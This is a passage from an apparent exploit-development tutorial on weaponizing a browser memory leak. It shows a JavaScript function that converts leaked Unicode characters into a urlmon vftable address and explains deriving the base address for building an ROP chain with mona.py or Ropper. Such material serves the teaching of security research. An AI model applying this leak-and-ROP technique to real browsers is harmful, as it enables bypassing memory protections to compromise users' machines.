![](bbox=[0.12, 0.08, 0.88, 0.26])

We need to get the Unicode of the characters printed onto the screen and convert it to hexadecimal so that we can see if it matches what we are expecting to see. We have confirmed and tracked the memory leak bug, so now let's move on to weaponizing it!

# Weaponizing the Memory Leak

We are now at the point where we need to add some simple lines of JavaScript in order to utilize the leaked address. We first want to confirm that we are able to successfully access and convert the Unicode to a hexadecimal value. We then need to locate the RVA offset and subtract it from the leaked address to get the base address. Once we do that, we can use mona.py from corelanc0d3r—or another tool, such as Ropper by Sascha Schirra—to generate an ROP chain based on the RVA offsets.

We will use the file Leaked_urlmon.html for this next run. First, let's look at the addition of the printLeak function that will convert our leaked address:

```
function printLeak() {
    var text = document.getElementById("textarea"); //Getting swapped element
    var leak = text.value.substring(0, 2); // Grabbing index[0:2]
    var hex = parseInt(leak.charCodeAt(1).toString(16) // Line wrapped
    ... + leak.charCodeAt().toString(16), 16);
    // parseInt( leak.charCodeAt(1).toString(16)
    // + leak.charCodeAt(0).toString(16), 16 )
    // Above line lifted on April 20th, 2017 from:
    // https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/
    // windows/browser/ms13_037_svg_dashstyle.rb
    text.value = "Leaked address: 0x"+hex.toString(16) // Line wrapped
    ... + " - urlmon!CSecurityManager::`vftable'";
}
```

Let's go through each line. Here's the first one:

```
var text = document.getElementById("textarea");
```

This line simply gets the textarea element based on its ID and assigns it to the variable text.

In the second line, we are creating a variable called leak and accessing the first two Unicode characters printed on the page:

```
var leak = text.value.substring(0, 2);
```

The first character we saw earlier was 蕃. Let's use an online converter to print out the